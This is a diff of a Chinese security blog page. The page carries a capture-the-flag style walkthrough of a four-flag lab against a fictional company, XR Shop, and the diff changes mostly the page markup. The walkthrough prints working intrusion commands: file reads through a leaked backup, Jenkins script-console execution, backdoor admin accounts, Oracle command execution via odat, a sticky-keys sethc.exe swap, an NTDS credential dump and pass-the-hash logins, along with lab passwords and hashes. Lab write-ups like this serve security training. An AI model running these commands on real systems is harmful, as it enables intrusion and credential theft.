@@ -62,7 +62,7 @@
         <article class="article-content" data-article-content><blockquote>
 <p>在这个靶场中，您将扮演一名资深黑客，被雇佣来评估虚构公司 XR Shop 的网络安全。您需要通过渗透测试逐个击破公司暴露在公网的应用，并通过后渗透技巧深入 XR Shop 的内部网络，寻找潜在的弱点和漏洞，并通过滥用 Windows 特权获取管理员权限，最终并获取隐藏在其内部的核心机密。该靶场共有 4 个 Flag，分布于不同的靶机。</p>
 </blockquote>
-<h1 id="第一关">第一关<a class="heading-anchor" href="#%E7%AC%AC%E4%B8%80%E5%85%B3" aria-label="链接到 第一关">#</a></h1><blockquote>
+<h2 id="第一关">第一关<a class="heading-anchor" href="#%E7%AC%AC%E4%B8%80%E5%85%B3" aria-label="链接到 第一关">#</a></h2><blockquote>
 <p>请获取 XR Shop 官网源码的备份文件，并尝试获得系统上任意文件读取的能力。并且，管理员在配置 Jenkins 时，仍然选择了使用初始管理员密码，请尝试读取该密码并获取 Jenkins 服务器权限。Jenkins 配置目录为 C:\ProgramData\Jenkins.jenkins。</p>
 </blockquote>
 <p>fscan起手</p>
@@ -108,7 +108,7 @@
 [2025-04-25 13:51:37] [<span class="hljs-title">SUCCESS</span>] 网站标题 <span class="hljs-title">http</span>://39.99.134.90:8080  状态码:403 长度:548    标题:无标题
 [2025-04-25 13:51:47] [<span class="hljs-title">SUCCESS</span>] 检测到漏洞 <span class="hljs-title">http</span>://39.99.134.90:80/<span class="hljs-title">www.zip</span> <span class="hljs-title">poc</span>-<span class="hljs-title">yaml</span>-<span class="hljs-title">backup</span>-<span class="hljs-title">file</span> 参数:[{<span class="hljs-title">path</span> <span class="hljs-title">www</span>} {<span class="hljs-title">ext</span> <span class="hljs-title">zip</span>}]
 [2025-04-25 14:13:46] [<span class="hljs-title">SUCCESS</span>] 扫描已完成: 12/12</span></code></pre></figure><p>有源码备份 下载审计一下</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425135733428.png" alt="image-20250425135733428" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1757 / 698;--image-max-width:1913px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425135733428.png" alt="image-20250425135733428" loading="lazy" decoding="async" width="1757" height="698"></span></figure></p>
 <figure class="code-block"><figcaption><span>php</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-variable">$logfile</span> = <span class="hljs-title function_ invoke__">rawurldecode</span>( <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;logfile&#x27;</span>] );
 <span class="hljs-comment">// Make sure the file is exist.</span>
@@ -119,25 +119,25 @@
 }
 <span class="hljs-keyword">exit</span>;</code></pre></figure><p>直接读取文件并echo出来了</p>
 <p>读取密码</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425135931103.png" alt="image-20250425135931103" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2552 / 999;--image-max-width:1941px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425135931103.png" alt="image-20250425135931103" loading="lazy" decoding="async" width="2552" height="999"></span></figure></p>
 <p>读取flag</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425135957636.png" alt="	" loading="lazy" decoding="async"><figcaption>	</figcaption></figure></p>
-<h1 id="第二关">第二关<a class="heading-anchor" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3" aria-label="链接到 第二关">#</a></h1><blockquote>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2552 / 1011;--image-max-width:1918px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425135957636.png" alt="	" loading="lazy" decoding="async" width="2552" height="1011"></span><figcaption>	</figcaption></figure></p>
+<h2 id="第二关">第二关<a class="heading-anchor" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3" aria-label="链接到 第二关">#</a></h2><blockquote>
 <p>管理员为 Jenkins 配置了 Gitlab，请尝试获取 Gitlab API Token，并最终获取 Gitlab 中的敏感仓库。获取敏感信息后，尝试连接至 Oracle 数据库，并获取 ORACLE 服务器控制权限。</p>
 </blockquote>
 <p>拿到密码登录后台</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425140040123.png" alt="image-20250425140040123" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2552 / 1448;--image-max-width:1339px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425140040123.png" alt="image-20250425140040123" loading="lazy" decoding="async" width="2552" height="1448"></span></figure></p>
 <p><a href="http://39.99.134.90:8080/manage/script可以执行命令" target="_blank" rel="noopener noreferrer">http://39.99.134.90:8080/manage/script可以执行命令<svg class="icon external-link-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a></p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425140315081.png" alt="image-20250425140315081" loading="lazy" decoding="async"></figure></p>
-<figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">println(&quot;whoami&quot;.execute().text)</code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425140449280.png" alt="image-20250425140449280" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2552 / 1448;--image-max-width:1339px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425140315081.png" alt="image-20250425140315081" loading="lazy" decoding="async" width="2552" height="1448"></span></figure></p>
+<figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">println(&quot;whoami&quot;.execute().text)</code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1032 / 747;--image-max-width:1050px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425140449280.png" alt="image-20250425140449280" loading="lazy" decoding="async" width="1032" height="747"></span></figure></p>
 <p>添加用户</p>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">println(&quot;net user yiyi qwer1234! /add&quot;.execute().text)
 println(&quot;net localgroup administrators yiyi /add&quot;.execute().text)</code></pre></figure><p>rdp连接</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425140809089.png" alt="image-20250425140809089" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2032 / 1488;--image-max-width:1038px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425140809089.png" alt="image-20250425140809089" loading="lazy" decoding="async" width="2032" height="1488"></span></figure></p>
 <p>C:\ProgramData\Jenkins.jenkins\credentials.xml找到apjtoken</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425141349428.png" alt="image-20250425141349428" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2032 / 1488;--image-max-width:1038px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425141349428.png" alt="image-20250425141349428" loading="lazy" decoding="async" width="2032" height="1488"></span></figure></p>
 <p>拿到console中去解密一下</p>
-<figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">println(hudson.util.Secret.fromString(&quot;{AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh}&quot;).getPlainText())</code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425141458793.png" alt="image-20250425141458793" loading="lazy" decoding="async"></figure></p>
+<figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">println(hudson.util.Secret.fromString(&quot;{AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh}&quot;).getPlainText())</code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1428 / 610;--image-max-width:1779px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425141458793.png" alt="image-20250425141458793" loading="lazy" decoding="async" width="1428" height="610"></span></figure></p>
 <p>得到明文</p>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">glpat-7kD_qLH2PiQv_ywB9hz2</code></pre></figure><p>扫内网扫到gitlab</p>
 <figure class="code-block"><figcaption><span>cmd</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-cmd"><span class="hljs-function">C:\<span class="hljs-title">Users</span>\<span class="hljs-title">yiyi</span>\<span class="hljs-title">Desktop</span>&gt;<span class="hljs-title">fscan.exe</span> -<span class="hljs-title">h</span> 172.22.14.7/24
@@ -278,7 +278,7 @@ println(&quot;net localgroup administrators yiyi /add&quot;.execute().text)</cod
 <span class="hljs-title">remote</span>: <span class="hljs-title">Enumerating</span> <span class="hljs-title">objects</span>: 24, <span class="hljs-title">done</span>.
 <span class="hljs-title">remote</span>: <span class="hljs-title">Total</span> 24 (<span class="hljs-title">delta</span> 0), <span class="hljs-title">reused</span> 0 (<span class="hljs-title">delta</span> 0), <span class="hljs-title">pack</span>-<span class="hljs-title">reused</span> 24
 <span class="hljs-title">Receiving</span> <span class="hljs-title">objects</span>: 100% (24/24), 15.09 <span class="hljs-title">KiB</span> | 498.00 <span class="hljs-title">KiB</span>/<span class="hljs-title">s</span>, <span class="hljs-title">done</span>.
-<span class="hljs-title">Resolving</span> <span class="hljs-title">deltas</span>: 100% (1/1), <span class="hljs-title">done</span>.</span></code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425143547081.png" alt="image-20250425143547081" loading="lazy" decoding="async"></figure></p>
+<span class="hljs-title">Resolving</span> <span class="hljs-title">deltas</span>: 100% (1/1), <span class="hljs-title">done</span>.</span></code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1324 / 669;--image-max-width:1504px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425143547081.png" alt="image-20250425143547081" loading="lazy" decoding="async" width="1324" height="669"></span></figure></p>
 <blockquote>
 <p>username: xradmin</p>
 <p>password: fcMyE8t9E4XdsKf</p>
@@ -286,8 +286,8 @@ println(&quot;net localgroup administrators yiyi /add&quot;.execute().text)</cod
 <p>直接使用odat</p>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">proxychains odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec &#039;net user yiyi qwer1234! /add&#039;
 proxychains odat dbmsscheduler -s 172.22.14.31 -p 1521 -d ORCL -U xradmin -P fcMyE8t9E4XdsKf --sysdba --exec &#039;net localgroup administrators yiyi /add&#039;</code></pre></figure><p>拿到flag2</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425144640975.png" alt="image-20250425144640975" loading="lazy" decoding="async"></figure></p>
-<h1 id="第三关">第三关<a class="heading-anchor" href="#%E7%AC%AC%E4%B8%89%E5%85%B3" aria-label="链接到 第三关">#</a></h1><blockquote>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2032 / 1488;--image-max-width:1038px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425144640975.png" alt="image-20250425144640975" loading="lazy" decoding="async" width="2032" height="1488"></span></figure></p>
+<h2 id="第三关">第三关<a class="heading-anchor" href="#%E7%AC%AC%E4%B8%89%E5%85%B3" aria-label="链接到 第三关">#</a></h2><blockquote>
 <p>攻击办公区内网，获取办公 PC 控制权限，并通过特权滥用提升至 SYSTEM 权限。</p>
 </blockquote>
 <p>internal-secret中拿到一堆账密 对应扫出来的0923的主机</p>
@@ -366,10 +366,10 @@ SeIncreaseWorkingSetPrivilege 增加进程工作集 已启用
 *Evil-WinRM* PS C:\windows\system32&gt; <span class="hljs-built_in">ren</span> sethc.exe sethc.bak
 *Evil-WinRM* PS C:\windows\system32&gt; <span class="hljs-built_in">ren</span> <span class="hljs-built_in">cmd</span>.exe sethc.exe
 *Evil-WinRM* PS C:\windows\system32&gt; </code></pre></figure><p>ctrl+fn+alt+键盘右键锁屏然后读flag，并且创建一个新用户</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425151117089.png" alt="image-20250425151117089" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2088 / 1529;--image-max-width:1038px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425151117089.png" alt="image-20250425151117089" loading="lazy" decoding="async" width="2088" height="1529"></span></figure></p>
 <p>创建个administrator用户进入</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425151459938.png" alt="image-20250425151459938" loading="lazy" decoding="async"></figure></p>
-<h1 id="第四关">第四关<a class="heading-anchor" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3" aria-label="链接到 第四关">#</a></h1><blockquote>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2136 / 1529;--image-max-width:1062px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425151459938.png" alt="image-20250425151459938" loading="lazy" decoding="async" width="2136" height="1529"></span></figure></p>
+<h2 id="第四关">第四关<a class="heading-anchor" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3" aria-label="链接到 第四关">#</a></h2><blockquote>
 <p>尝试接管备份管理操作员帐户，并通过转储 NTDS 获得域管理员权限，最终控制整个域环境。</p>
 </blockquote>
 <p>抓取密码</p>
@@ -1627,9 +1627,9 @@ tianlong:aes128-cts-hmac-sha1-96:860569a4d25b4649055da07b96d2e41f
 tianlong:des-cbc-md5:e9464389858c0ba1
 [*] Cleaning up... </code></pre></figure><p>登录</p>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">proxychains evil-winrm -i 172.22.14.11 -u Administrator -H &quot;70c39b547b7d8adec35ad7c09fb1d277&quot;</code></pre></figure><p>拿到flag4</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425161429849.png" alt="image-20250425161429849" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:949 / 244;--image-max-width:2956px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250425161429849.png" alt="image-20250425161429849" loading="lazy" decoding="async" width="949" height="244"></span></figure></p>
 </article>
-        <aside class="toc-column"><nav class="post-toc" aria-label="文章目录" ><span>目录</span><div data-toc-list><p>本文没有分节</p></div></nav></aside>
+        <aside class="toc-column"><nav class="post-toc" aria-label="文章目录" ><span>目录</span><div data-toc-list><a class="toc-depth-2" href="#%E7%AC%AC%E4%B8%80%E5%85%B3">第一关</a><a class="toc-depth-2" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3">第二关</a><a class="toc-depth-2" href="#%E7%AC%AC%E4%B8%89%E5%85%B3">第三关</a><a class="toc-depth-2" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3">第四关</a></div></nav></aside>
       </div>
       <div class="post-tools section-shell">
         <button type="button" data-copy-link><svg class="icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M9 17H7A5 5 0 0 1 7 7h2"></path><path d="M15 7h2a5 5 0 1 1 0 10h-2"></path><line x1="8" x2="16" y1="12" y2="12"></line></svg><span>复制链接</span></button>
@@ -1644,7 +1644,7 @@ tianlong:des-cbc-md5:e9464389858c0ba1
     <a href="/posts/8cc5a836.html"><span>2026/02/11</span><strong>HMVM-MS02423</strong><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a>
     <a href="/posts/3d3db288.html"><span>2026/02/10</span><strong>HMVM-Coolpg</strong><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a></div></section>
     </main>
-    
+    <button class="floating-toc-button" type="button" data-toc-toggle aria-label="打开目录" data-tooltip="目录"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M8 5h13"></path><path d="M13 12h8"></path><path d="M13 19h8"></path><path d="M3 10a2 2 0 0 0 2 2h3"></path><path d="M3 5v12a2 2 0 0 0 2 2h3"></path></svg></button>
     
     <footer class="site-footer">
       <div class="footer-lead">
@@ -1664,26 +1664,26 @@ tianlong:des-cbc-md5:e9464389858c0ba1
       </div>
     </footer>
     
-    <div class="mobile-menu" data-mobile-menu aria-hidden="true">
+    <dialog class="mobile-menu" data-mobile-menu aria-label="站点导航">
       <button class="mobile-menu-close" type="button" data-menu-close aria-label="关闭菜单"><svg class="icon" width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
       <nav aria-label="移动导航"><a class="mobile-menu-link" href="/#articles">文章</a><a class="mobile-menu-link" href="/categories/">专题</a><a class="mobile-menu-link" href="/tags/">标签</a><a class="mobile-menu-link" href="/archives/">归档</a><a class="mobile-menu-link" href="/about/">关于</a></nav>
       <div class="mobile-menu-social">
     <a href="https://github.com/xyaxxya" aria-label="GitHub" target="_blank" rel="noopener noreferrer"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="18" r="3"></circle><circle cx="6" cy="6" r="3"></circle><circle cx="18" cy="6" r="3"></circle><path d="M18 9v2c0 .6-.4 1-1 1H7c-.6 0-1-.4-1-1V9"></path><path d="M12 12v3"></path></svg></a>
     <a href="https://blog.csdn.net/xydsg" aria-label="CSDN" target="_blank" rel="noopener noreferrer"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M13.4 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7.4"></path><path d="M2 6h4"></path><path d="M2 10h4"></path><path d="M2 14h4"></path><path d="M2 18h4"></path><path d="M21.378 5.626a1 1 0 1 0-3.004-3.004l-5.01 5.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z"></path></svg></a>
     <a href="mailto:3170234809@qq.com" aria-label="Email"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m22 7-8.991 5.727a2 2 0 0 1-2.009 0L2 7"></path><rect x="2" y="4" width="20" height="16" rx="2"></rect></svg></a></div>
-    </div>
+    </dialog>
     
-    <dialog class="search-dialog" data-search-dialog>
+    <dialog class="search-dialog" data-search-dialog aria-labelledby="search-dialog-title" aria-describedby="search-dialog-status">
       <div class="search-shell">
         <header class="search-header">
-          <span class="search-title">站内搜索</span>
+          <span class="search-title" id="search-dialog-title">站内搜索</span>
           <button class="icon-button" type="button" data-close-search aria-label="关闭搜索"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
         </header>
         <label class="search-field">
           <svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m21 21-4.34-4.34"></path><circle cx="11" cy="11" r="8"></circle></svg>
           <input type="search" data-search-input autocomplete="off" placeholder="搜索标题、标签或正文" aria-label="搜索文章">
         </label>
-        <p class="search-status" data-search-status>输入关键词，查找 39 篇记录。</p>
+        <p class="search-status" id="search-dialog-status" data-search-status>输入关键词，查找 39 篇记录。</p>
         <div class="search-results" data-search-results aria-live="polite"></div>
         <template data-search-result-icon><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></template>
       </div>
